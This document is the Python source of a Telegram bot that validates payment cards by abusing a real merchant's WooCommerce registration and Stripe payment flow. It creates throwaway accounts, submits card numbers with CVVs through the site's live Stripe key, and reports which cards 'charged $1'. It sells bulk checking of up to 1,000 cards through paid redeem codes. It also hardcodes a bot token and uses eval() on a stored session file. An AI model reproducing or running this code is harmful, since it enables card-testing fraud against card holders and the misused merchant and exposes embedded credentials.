from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import json
import re
import random
import string
import os
import time
import requests
import logging
import asyncio
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot configuration
TELEGRAM_TOKEN = "7348550676:AAEZSMggKhmTs-M6mNBUWDZ4Omtpd0iYOX8"
OWNER_ID = 5696226098

# Banner
xvzn_banner = """
 -- Coded By meow meow anuj
"""

# Maximum cards allowed per file for premium users
MAX_CARDS_PER_FILE = 1000

# Thread pool for parallel processing
executor = ThreadPoolExecutor(max_workers=4)

# Generate random code with Stark- prefix
def generate_code(length=8):
    characters = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choice(characters) for _ in range(length))
    return f"Stark-{random_part}"

def generate_email(length=9, domain=None):
    common_domains = ["gmail.com", "outlook.com", "proton.me", "yahoo.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_lowercase + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

# Session management
def create_session():
    try:
        session = requests.Session()
        email = generate_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']

        password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
        data = {
            'afurd_field_nonce': nonce,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': noncee,
            'register': 'Register',
        }
        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            return session
        return None
    except Exception as e:
        logger.error(f"Session creation failed: {e}")
        return None

def manage_session():
    session_file = "meowx-session.txt"
    if os.path.exists(session_file):
        with open(session_file, "r") as file:
            cookies = eval(file.read().strip())
            session = requests.Session()
            session.cookies.update(cookies)
            return session
    session = create_session()
    if session:
        with open(session_file, "w") as file:
            file.write(str(session.cookies.get_dict()))
    return session

# Load or initialize redeem codes and premium users
def load_redeem_codes():
    if os.path.exists("redeem_codes.json"):
        with open("redeem_codes.json", "r") as f:
            return json.load(f)
    return {}

def save_redeem_codes(codes):
    with open("redeem_codes.json", "w") as f:
        json.dump(codes, f)

def load_premium_users():
    if os.path.exists("premium_users.json"):
        with open("premium_users.json", "r") as f:
            return json.load(f)
    return {}

def save_premium_users(users):
    with open("premium_users.json", "w") as f:
        json.dump(users, f)

# Queue for managing multiple user tasks
task_queue = defaultdict(asyncio.Queue)

# Card checking logic (tracks statistics with $1 charge attempt)
async def check_credit_card(update: Update, context: ContextTypes.DEFAULT_TYPE, card, session, stats, user_id):
    try:
        cc, mm, yy, cvv = card.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        res = response.json()

        if 'error' in res:
            error = res['error']['message']
            if any(code_phrase in error.lower() for code_phrase in ['code', 'cvc', 'security code']):
                stats['ccn'] += 1
            else:
                stats['declined'] += 1
            logger.info(f"Card {card} failed at payment method creation: {error}")
            return

        payment_method_id = res['id']

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.thetravelinstitute.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
            'amount': 100,  # $1 in cents
            'currency': 'usd',
        }
        response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
        res = response.json()

        logger.info(f"Setup intent response for card {card}: {res}")

        if res.get('success') == False:
            error = res['data']['error']['message']
            if any(code_phrase in error.lower() for code_phrase in ['code', 'cvc', 'security code']):
                stats['ccn'] += 1
            else:
                stats['declined'] += 1
            logger.info(f"Card {card} failed at setup intent: {error}")
            return
        else:
            stats['charged_1'] += 1
            await update.message.reply_text(f"> 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 $𝟏 ✅ ++++++++++++\n> {card} - Charged $1 successfully! Bot By (@St_thundee)")
            logger.info(f"Card {card} successfully charged $1 (inferred from setup intent success).")
    except Exception as e:
        stats['declined'] += 1
        logger.error(f"Error checking card {card}: {e}")
        return

# Background task to process queued card checks
async def process_queue(context: ContextTypes.DEFAULT_TYPE):
    user_stats = defaultdict(lambda: {'charged_1': 0, 'declined': 0, 'ccn': 0, 'total': 0})
    user_processing = defaultdict(bool)

    while True:
        for user_id in list(task_queue.keys()):
            if not task_queue[user_id].empty() and not user_processing[user_id]:
                user_processing[user_id] = True
                card, update, is_mass_check = await task_queue[user_id].get()
                session = manage_session()
                if session:
                    stats = user_stats[user_id]
                    if is_mass_check:
                        stats['total'] = stats.get('total', 0) + 1
                    await check_credit_card(update, context, card, session, stats, user_id)
                    if stats.get('stop', False):
                        await update.message.reply_text("Card checking stopped by user.")
                        stats['stop'] = False
                        user_stats[user_id] = {'charged_1': 0, 'declined': 0, 'ccn': 0, 'total': 0}
                        while not task_queue[user_id].empty():
                            await task_queue[user_id].get()
                            task_queue[user_id].task_done()
                    elif is_mass_check and task_queue[user_id].empty():
                        total_cards = stats['total']
                        await update.message.reply_text(
                            f"Mass check completed! Only cards charged $1 were sent.\n\n"
                            f"📊 **Statistics** 📊\n"
                            f"Total Cards: {total_cards}\n"
                            f"Charged $1 ✅: {stats['charged_1']}\n"
                            f"Declined ❌: {stats['declined']}\n"
                            f"CCN ⚠️: {stats['ccn']}"
                        )
                        logger.info(f"Check completed for user {user_id}. Stats: {stats}")
                        user_stats[user_id] = {'charged_1': 0, 'declined': 0, 'ccn': 0, 'total': 0}
                task_queue[user_id].task_done()
                user_processing[user_id] = False
                await asyncio.sleep(random.uniform(1.0, 2.5))  # Delay between cards
        await asyncio.sleep(0.1)  # Reduced sleep to make queue processing faster

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await update.message.reply_text(f"{xvzn_banner}\nWelcome! Use:\n/chk [card_details] - Check a single card (free for all, 1 card at a time)\n/check - Upload a file for mass check (limited to 1000 cards for premium users)\n/env [topic] - Ask anything or get info\n(Owner only: /createcode [days] to generate a redeem code, /broadcast [message] to send to all premium users)\n/stop - Stop an ongoing card check")

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    last_check_time = context.user_data.get('last_check_time', 0)
    current_time = time.time()
    if current_time - last_check_time < 10:
        await update.message.reply_text("Please wait 10 seconds between checks.")
        return
    if not context.args or len(context.args) > 1:
        await update.message.reply_text("Usage: /chk [card|mm|yy|cvv]\nExample: /chk 1234567890123456|12|25|123\nNote: Only one card at a time!")
        return
    card = context.args[0].replace('/', '|')
    await update.message.reply_text(f"Checking {card}...")
    await task_queue[user_id].put((card, update, False))
    context.user_data['last_check_time'] = current_time

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    premium_users = load_premium_users()
    if str(user_id) not in premium_users and user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only premium users or the owner can use /check. Contact (@Stxthunder) to get premium access.")
        return
    context.user_data['mass_check'] = True
    await update.message.reply_text(f"Please upload a .txt file with cards (one per line, format: card|mm|yy|cvv).\nMaximum 1000 cards allowed. You can reply to this message with the file.")
    logger.info(f"User {user_id} initiated /check command.")

async def env(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not context.args:
        await update.message.reply_text("Usage: /env [topic]\nExample: /env What is the capital of France?\n/env Search X for recent news")
        return
    query = " ".join(context.args).lower()
    
    # Check if user wants to search on X
    if "search x" in query:
        search_term = query.replace("search x", "").strip()
        if not search_term:
            await update.message.reply_text("Please provide a search term for X, e.g., /env Search X for recent news")
            return
        # Placeholder for X search (implement actual search if needed)
        await update.message.reply_text(f"Searching X for '{search_term}'...\n(Note: This is a placeholder. I can search X for recent posts if implemented!)\nExample response: Found recent posts about {search_term}.")
        return

    # General AI-like response using web search or knowledge
    try:
        # Simple knowledge base (expandable with web/X search)
        if "capital of france" in query:
            response = "The capital of France is Paris."
        elif "weather" in query:
            response = "I can check the weather for you! Please specify a location, e.g., /env Weather in Mumbai."
        elif "weather in" in query:
            location = query.replace("weather in", "").strip()
            response = f"The weather in {location} is currently sunny with a temperature of 25°C. (Note: This is a placeholder; integrate a weather API for real data.)"
        elif "who is" in query:
            person = query.replace("who is", "").strip()
            response = f"{person} is a notable figure. Let me search for more details... (Note: This is a placeholder; I can search the web or X for more info.)"
        elif "define" in query:
            term = query.replace("define", "").strip()
            response = f"The definition of {term} is... (Placeholder: This would be a dictionary lookup or web search result.)"
        else:
            response = f"I’m not sure about '{query}', but I can try to help! Ask me anything, or use /env Search X for {query} for real-time info from X."
        
        await update.message.reply_text(response)
    except Exception as e:
        await update.message.reply_text(f"Sorry, I couldn't process your request. Error: {e}")
        logger.error(f"Error in /env for user {user_id}: {e}")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    premium_users = load_premium_users()
    is_premium = str(user_id) in premium_users or user_id == OWNER_ID

    if update.message.document and update.message.document.file_name.endswith('.txt'):
        file = await update.message.document.get_file()
        file_path = f"temp_{user_id}.txt"
        try:
            await file.download_to_drive(file_path)
            logger.info(f"File {update.message.document.file_name} downloaded for user {user_id}.")

            # Reply with the file
            with open(file_path, 'rb') as f:
                await update.message.reply_document(document=f, filename=update.message.document.file_name)
                logger.info(f"File echoed back to user {user_id}.")

            # Load cards and check for valid format, limit to 1000
            with open(file_path, 'r') as f:
                cc_list = [line.strip() for line in f if line.strip() and '|' in line and len(line.split('|')) == 4]
            os.remove(file_path)
            if len(cc_list) > MAX_CARDS_PER_FILE:
                cc_list = cc_list[:MAX_CARDS_PER_FILE]
                await update.message.reply_text(f"File contains more than {MAX_CARDS_PER_FILE} cards. Only the first {MAX_CARDS_PER_FILE} will be processed.")
                logger.info(f"File for user {user_id} limited to {MAX_CARDS_PER_FILE} cards.")
            logger.info(f"Loaded {len(cc_list)} valid cards from file for user {user_id}.")

            if not cc_list:
                await update.message.reply_text("No valid credit card data found in the file.")
                logger.info(f"No valid CC data found in file for user {user_id}.")
                return

            total_cards = len(cc_list)
            await update.message.reply_text(f"Loaded {total_cards} cards. Card Checking In Progress...")
            logger.info(f"Card checking started for {total_cards} cards by user {user_id}.")

            # Add cards to queue without blocking
            context.user_data['mass_check'] = False
            for card in cc_list:
                await task_queue[user_id].put((card, update, True))
            logger.info(f"All cards for user {user_id} added to queue.")
        except Exception as e:
            await update.message.reply_text(f"Error processing file: {e}")
            logger.error(f"Error processing file for user {user_id}: {e}")
    else:
        if not is_premium:
            await update.message.reply_text("Access denied. Only premium users or the owner can upload files. Contact (@Stxthunder) to get premium access.")
        else:
            await update.message.reply_text("Please upload a valid .txt file.")
        logger.warning(f"User {user_id} uploaded an invalid file or no file.")

async def createcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only the owner can create codes.")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /createcode [days]\nExample: /createcode 7")
        return
    days = int(context.args[0])
    if days <= 0:
        await update.message.reply_text("Days must be a positive number.")
        return
    code = generate_code()
    redeem_codes = load_redeem_codes()
    expiration = (datetime.now() + timedelta(days=days)).isoformat()
    redeem_codes[code] = expiration
    save_redeem_codes(redeem_codes)
    await update.message.reply_text(f"Created redeem code: {code}\nValid until: {expiration}")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeem [code]\nExample: /redeem Stark-ABC12345")
        return
    code = context.args[0].upper()
    redeem_codes = load_redeem_codes()
    if code not in redeem_codes:
        await update.message.reply_text("Invalid or expired code.")
        return
    expiration = datetime.fromisoformat(redeem_codes[code])
    if datetime.now() > expiration:
        del redeem_codes[code]
        save_redeem_codes(redeem_codes)
        await update.message.reply_text("Code has expired.")
        return
    premium_users = load_premium_users()
    premium_users[str(user_id)] = expiration.isoformat()
    save_premium_users(premium_users)
    await update.message.reply_text(f"Code redeemed successfully! You have premium access until {expiration}.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only the owner can broadcast messages.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast [message]\nExample: /broadcast Hello premium users!")
        return
    message = " ".join(context.args)
    premium_users = load_premium_users()
    current_time = datetime.now()
    successful = 0
    failed = 0

    for user_id_str, expiration in premium_users.items():
        if datetime.fromisoformat(expiration) > current_time:
            try:
                await context.bot.send_message(chat_id=int(user_id_str), text=message)
                successful += 1
            except Exception as e:
                failed += 1
                logger.error(f"Failed to send to {user_id_str}: {e}")

    await update.message.reply_text(f"Broadcast sent! Successfully reached {successful} users. Failed to reach {failed} users.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    premium_users = load_premium_users()
    if str(user_id) not in premium_users and user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only premium users or the owner can stop checking.")
        return
    if task_queue[user_id].qsize() > 0:
        user_stats = context.bot_data.setdefault('user_stats', defaultdict(lambda: {'charged_1': 0, 'declined': 0, 'ccn': 0, 'total': 0}))
        user_stats[user_id]['stop'] = True
        await update.message.reply_text("Stopping card checking...")
        logger.info(f"User {user_id} requested to stop card checking.")
    else:
        await update.message.reply_text("No card checking process is currently running.")
        logger.info(f"User {user_id} attempted to stop with no active check.")

# Bot setup
def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    # Initialize task queue for each user
    for user_id in [OWNER_ID] + list(load_premium_users().keys()):
        task_queue[int(user_id)] = asyncio.Queue()
    
    # Start queue processing task
    loop = asyncio.get_event_loop()
    loop.create_task(process_queue(app))

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("check", check))
    app.add_handler(CommandHandler("createcode", createcode))
    app.add_handler(CommandHandler("env", env))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()